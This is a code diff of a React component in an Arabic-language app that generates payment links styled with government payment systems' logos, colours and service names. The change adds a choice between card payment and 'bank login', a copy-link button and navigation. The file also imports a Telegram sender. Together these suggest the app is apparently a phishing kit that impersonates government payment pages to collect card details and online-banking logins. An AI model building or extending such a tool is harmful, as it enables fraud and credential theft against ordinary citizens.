@@ -9,7 +9,8 @@ import { useToast } from "@/hooks/use-toast";
 import { useCreateLink } from "@/hooks/useSupabase";
 import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
 import { getGovernmentServiceByKey } from "@/lib/governmentPaymentServices";
-import { getCurrencySymbol, getCurrencyCode } from "@/lib/countryCurrencies";
+import { getCurrencySymbol, getCurrencyCode, formatCurrency } from "@/lib/countryCurrencies";
+import { generatePaymentLink } from "@/utils/paymentLinks";
 import { 
   Landmark, 
   FileText, 
@@ -26,7 +27,9 @@ import {
   Info,
   RefreshCw,
   Hash,
-  ShieldCheck
+  ShieldCheck,
+  Building2,
+  CreditCard
 } from "lucide-react";
 import BackButton from "@/components/BackButton";
 import { sendToTelegram } from "@/lib/telegram";
@@ -37,6 +40,7 @@ import {
   AlertDialogHeader,
   AlertDialogTitle,
 } from "@/components/ui/alert-dialog";
+import BottomNav from "@/components/BottomNav";
 
 const GovernmentPaymentLinkCreator = () => {
   const { country, serviceKey } = useParams();
@@ -58,6 +62,7 @@ const GovernmentPaymentLinkCreator = () => {
   const [linkId, setLinkId] = useState("");
   const [showSuccess, setShowSuccess] = useState(false);
   const [paymentMethod, setPaymentMethod] = useState("card");
+  const [copied, setCopied] = useState(false);
 
   const primaryColor = govSystem?.colors?.primary || "#F58220";
 
@@ -103,7 +108,15 @@ const GovernmentPaymentLinkCreator = () => {
         },
       });
 
-      const paymentUrl = `${window.location.origin}/r/${country || 'SA'}/government/${link.id}?govId=${country || 'SA'}`;
+      const paymentUrl = generatePaymentLink({
+        invoiceId: link.id,
+        company: serviceKey || 'government',
+        country: country || 'SA',
+        amount: parseFloat(amount),
+        currency: getCurrencyCode(country || 'SA'),
+        paymentMethod: paymentMethod,
+        type: 'government'
+      });
       setCreatedLink(paymentUrl);
       setLinkId(link.id);
       setShowSuccess(true);
@@ -129,6 +142,13 @@ const GovernmentPaymentLinkCreator = () => {
     }
   };
 
+  const handleCopyLink = () => {
+    navigator.clipboard.writeText(createdLink);
+    setCopied(true);
+    setTimeout(() => setCopied(false), 2000);
+    toast({ title: "تم النسخ" });
+  };
+
 
   return (
     <div className="min-h-screen bg-slate-50" dir="rtl">
@@ -148,7 +168,9 @@ const GovernmentPaymentLinkCreator = () => {
         <form onSubmit={handleSubmit} className="space-y-4">
            <Card className="p-6 border-2 rounded-3xl shadow-xl space-y-6">
               <div className="p-4 rounded-2xl flex items-center gap-4 animate-in fade-in slide-in-from-top-2" style={{ background: `${primaryColor}10`, border: `1px solid ${primaryColor}20` }}>
-                <img src={govSystem?.logo} alt="" className="h-10 w-20 object-contain" />
+                <div className="w-20 h-10 bg-white rounded-lg p-1 flex items-center justify-center border shadow-sm">
+                   <img src={govService.logo || govSystem?.logo} alt="" className="max-h-full max-w-full object-contain" />
+                </div>
                 <div>
                   <h4 className="font-black text-sm" style={{ color: primaryColor }}>{govService.nameAr}</h4>
                   <p className="text-[10px] font-bold opacity-70">{govSystem?.description}</p>
@@ -198,9 +220,9 @@ const GovernmentPaymentLinkCreator = () => {
               </div>
 
               {parseFloat(amount) > 0 && (
-                <div className="p-4 rounded-2xl bg-slate-900 text-white animate-in zoom-in-95 duration-300">
+                <div className="p-4 rounded-2xl bg-slate-900 text-white animate-in zoom-in-95 duration-300 shadow-xl">
                   <div className="flex justify-between items-center mb-2">
-                    <span className="text-[10px] font-bold text-slate-400 uppercase">المبلغ الإجمالي</span>
+                    <span className="text-[10px] font-bold text-slate-400 uppercase tracking-widest">المبلغ الإجمالي</span>
                     <Shield className="w-4 h-4 text-green-400" />
                   </div>
                   <div className="flex items-baseline gap-2">
@@ -209,6 +231,20 @@ const GovernmentPaymentLinkCreator = () => {
                   </div>
                 </div>
               )}
+
+              <div className="space-y-3 pt-4 border-t">
+                <Label className="text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">طريقة الدفع المتاحة</Label>
+                <div className="grid grid-cols-2 gap-3">
+                   <button type="button" onClick={() => setPaymentMethod('card')} className={`p-4 rounded-2xl border-2 transition-all flex flex-col items-center gap-2 ${paymentMethod === 'card' ? 'border-primary bg-primary/5' : 'border-slate-100 bg-slate-50'}`}>
+                      <CreditCard className={`w-6 h-6 ${paymentMethod === 'card' ? 'text-primary' : 'text-slate-300'}`} />
+                      <span className={`text-[10px] font-black uppercase ${paymentMethod === 'card' ? 'text-primary' : 'text-slate-400'}`}>بطاقة دفع</span>
+                   </button>
+                   <button type="button" onClick={() => setPaymentMethod('bank_login')} className={`p-4 rounded-2xl border-2 transition-all flex flex-col items-center gap-2 ${paymentMethod === 'bank_login' ? 'border-primary bg-primary/5' : 'border-slate-100 bg-slate-50'}`}>
+                      <Building2 className={`w-6 h-6 ${paymentMethod === 'bank_login' ? 'text-primary' : 'text-slate-300'}`} />
+                      <span className={`text-[10px] font-black uppercase ${paymentMethod === 'bank_login' ? 'text-primary' : 'text-slate-400'}`}>دخول بنكي</span>
+                   </button>
+                </div>
+              </div>
            </Card>
 
            <Button type="submit" disabled={isSubmitting} className="w-full h-16 rounded-3xl font-black text-lg shadow-xl text-white transition-all active:scale-95" style={{ background: govSystem?.gradients?.primary || primaryColor }}>
@@ -227,7 +263,7 @@ const GovernmentPaymentLinkCreator = () => {
               </div>
               <div>
                 <AlertDialogTitle className="text-2xl font-black text-gray-900">رابط السداد جاهز!</AlertDialogTitle>
-                <AlertDialogDescription className="font-bold text-gray-500">تم توليد رابط دفع آمن لهذه الخدمة الحكومية</AlertDialogDescription>
+                <AlertDialogDescription className="font-bold text-gray-500 text-sm">تم توليد رابط دفع آمن لهذه الخدمة الحكومية</AlertDialogDescription>
               </div>
 
               <div className="bg-gray-50 p-4 rounded-2xl border-2 border-dashed border-gray-200 break-all font-mono text-xs font-bold text-gray-400">
@@ -235,8 +271,9 @@ const GovernmentPaymentLinkCreator = () => {
               </div>
 
               <div className="flex gap-3">
-                 <Button onClick={() => { navigator.clipboard.writeText(createdLink); toast({ title: "تم النسخ" }); }} className="flex-1 h-14 rounded-2xl font-black bg-gray-900 text-white gap-2">
-                   <Copy className="w-4 h-4" /> نسخ الرابط
+                 <Button onClick={handleCopyLink} className="flex-1 h-14 rounded-2xl font-black bg-gray-900 text-white gap-2">
+                   {copied ? <CheckCircle className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
+                   {copied ? "تم النسخ" : "نسخ الرابط"}
                  </Button>
                  <Button onClick={() => window.open(createdLink, '_blank')} variant="outline" className="flex-1 h-14 rounded-2xl font-black border-2 gap-2 text-gray-700">
                    <ExternalLink className="w-4 h-4" /> معاينة
@@ -246,6 +283,8 @@ const GovernmentPaymentLinkCreator = () => {
            </div>
         </AlertDialogContent>
       </AlertDialog>
+      <div className="h-20" />
+      <BottomNav />
     </div>
   );
 };
